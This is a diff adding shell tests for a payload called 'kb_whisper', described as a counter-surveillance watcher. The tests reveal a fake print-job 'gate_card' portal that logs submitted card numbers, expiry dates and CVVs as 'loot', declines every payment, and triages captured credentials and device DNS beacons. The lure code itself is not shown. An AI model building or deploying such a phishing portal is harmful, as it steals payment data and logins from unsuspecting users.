@@ -245,5 +245,57 @@ grep -q "born past expiry" payloads/kb_wire_start/wired.sh && { echo "PASS  date
 rm -rf "$KWD"
 
 
+
+echo "== kb_whisper (live counter-surveillance watcher; compose/lure/triage paths) =="
+WSH="$PAY/kb_whisper_start"
+WT=$(mktemp -d)
+# triage classifier: fixture capture lines must produce EXACT expected tags
+cat > "$WT/expect_cap.txt" << 'EXP'
+CRED|.|.
+FP|.|.
+REQ|.|GOLD
+REQ|SCAN_GOOGLE|.
+CARD|.|.
+REQ|SCAN_SOCIAL|.
+REQ|.|GOLD
+EXP
+busybox ash "$WSH/include/triage.sh" cap < "$HERE/fixtures/whisper/capture_fixture.log" > "$WT/cap_out.txt" 2>/dev/null
+if diff -q "$WT/expect_cap.txt" "$WT/cap_out.txt" >/dev/null; then echo "PASS  triage capture fixture 7/7 exact"; pass=$((pass+1)); else echo "FAIL  triage capture fixture"; diff "$WT/expect_cap.txt" "$WT/cap_out.txt" | head -4; fail=$((fail+1)); fi
+# GOLD must be GET-only: a POST body carrying %40 is a CRED, never zero-click gold
+head -1 "$WT/cap_out.txt" | grep -q 'GOLD' && { echo "FAIL  GOLD leaked onto POST line"; fail=$((fail+1)); } || { echo "PASS  GOLD scoped to GET (POST %40 = CRED only)"; pass=$((pass+1)); }
+# dns classifier: known beacons -> device classes, noise -> blank
+DCOUNT=$(busybox ash "$WSH/include/triage.sh" dns < "$HERE/fixtures/whisper/dns_fixture.log" 2>/dev/null | grep -c 'APPLE\|ANDROID_GOOGLE\|WINDOWS_MS\|APP_WHATSAPP')
+[ "$DCOUNT" = "4" ] && { echo "PASS  dns classify 4/4 beacons"; pass=$((pass+1)); } || { echo "FAIL  dns classify ($DCOUNT/4)"; fail=$((fail+1)); }
+# gate_card lure CGI: GET renders + captures qs gold; POST logs CARD line + declines forever
+GT="$WSH/template/gate_card"
+busybox ash -n "$GT/login.cgi" 2>/dev/null && { echo "PASS  ash -n gate_card/login.cgi"; pass=$((pass+1)); } || { echo "FAIL  gate_card parse"; fail=$((fail+1)); }
+export LOOTLOG="$WT/gate.log"
+env REQUEST_METHOD=GET QUERY_STRING="job=scan%40corp.com" REMOTE_ADDR=9.9.9.9 HTTP_USER_AGENT=TestUA busybox ash "$GT/login.cgi" > "$WT/get.html" 2>/dev/null
+grep -q "Release held print job" "$WT/get.html" && grep -q "qs=job=scan%40corp.com" "$WT/gate.log" && { echo "PASS  gate_card GET renders + qs capture"; pass=$((pass+1)); } || { echo "FAIL  gate_card GET"; fail=$((fail+1)); }
+GBODY='name=A.+Bradford&card=4111111111111111&mm=07&yy=29&cvv=424'
+printf '%s' "$GBODY" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$GBODY" | wc -c) REMOTE_ADDR=9.9.9.9 HTTP_USER_AGENT=TestUA busybox ash "$GT/login.cgi" > "$WT/post.html" 2>/dev/null
+grep -q "declined by the issuing network" "$WT/post.html" && grep -q "CARD .*card=4111111111111111|exp=07/29|cvv=424" "$WT/gate.log" && { echo "PASS  gate_card POST -> CARD loot + decline loop"; pass=$((pass+1)); } || { echo "FAIL  gate_card POST"; fail=$((fail+1)); }
+# start payload: compose path (KBW_SPAWN=0 hook — CI-safe, never spawns)
+mkdir -p "$WT/state" "$WT/portals"; printf 'PID=1\nTS=x\n' > "$WT/state/active"
+run "compose (no spawn)" "composed and checked" KBW_SPAWN=0 KBP_STATE="$WT/state" KBP_ROOT="$WT/portals" KBW_STATE="$WT/state" KBW_RUN="$WT/w.sh" MOCK_DIR=$(mktemp -d) -- "$WSH/payload.sh" --answers "LIST_PICKER=Alerts (LCD)"
+[ -f "$WT/w.sh" ] && busybox ash -n "$WT/w.sh" >/dev/null 2>&1 && { echo "PASS  composed watcher syntax-clean"; pass=$((pass+1)); } || { echo "FAIL  compose file missing/broken"; fail=$((fail+1)); }
+grep -q '^KBW_SENS=1' "$WT/w.sh" 2>/dev/null && { echo "PASS  env header carries alert level"; pass=$((pass+1)); } || { echo "FAIL  env header"; fail=$((fail+1)); }
+# lure self-deployed into mock portals root on start
+[ -f "$WT/portals/gate_card/login.cgi" ] && { echo "PASS  gate_card self-deployed"; pass=$((pass+1)); } || { echo "FAIL  lure self-deploy"; fail=$((fail+1)); }
+# cancel at picker = no compose at all
+rm -f "$WT/w.sh"
+run "cancel" "cancelled - nothing armed" KBW_SPAWN=0 KBP_STATE="$WT/state" KBP_ROOT="$WT/portals" KBW_STATE="$WT/state" KBW_RUN="$WT/w.sh" MOCK_DIR=$(mktemp -d) -- "$WSH/payload.sh" --cancel-first
+[ ! -f "$WT/w.sh" ] && { echo "PASS  cancel writes no compose"; pass=$((pass+1)); } || { echo "FAIL  cancel composed anyway"; fail=$((fail+1)); }
+# no portal marker -> refuses with pointer, exit 0 (run() requires rc 0)
+run "no portal -> refuse" "KB Portal is not running" KBW_SPAWN=0 KBP_STATE="$WT/nostate" KBW_STATE="$WT/state" MOCK_DIR=$(mktemp -d) -- "$WSH/payload.sh"
+# stop: no watcher running -> clean-state path + summary from existing log
+printf 'x CRED from 1.2.3.4\nx SCAN_GOOGLE 1.2.3.5\n' > "$WT/state/whisper.log"
+run "stop (idle)" "No whisper active" KBW_PIDFILE="$WT/nopid" KBW_STATE="$WT/state" MOCK_DIR=$(mktemp -d) -- "$PAY/kb_whisper_stop/payload.sh"
+for f in "$WSH/payload.sh" "$WSH/include/triage.sh" "$WSH/include/watcher.sh" "$PAY/kb_whisper_stop/payload.sh"; do
+  busybox ash -n "$f" 2>/dev/null && { echo "PASS  ash -n $(basename "$f")"; pass=$((pass+1)); } || { echo "FAIL  parse $f"; fail=$((fail+1)); }
+done
+rm -rf "$WT" "$WSH/.compose.tmp" 2>/dev/null
+
+
 echo "== result: $pass pass, $fail fail =="
 [ $fail -eq 0 ]
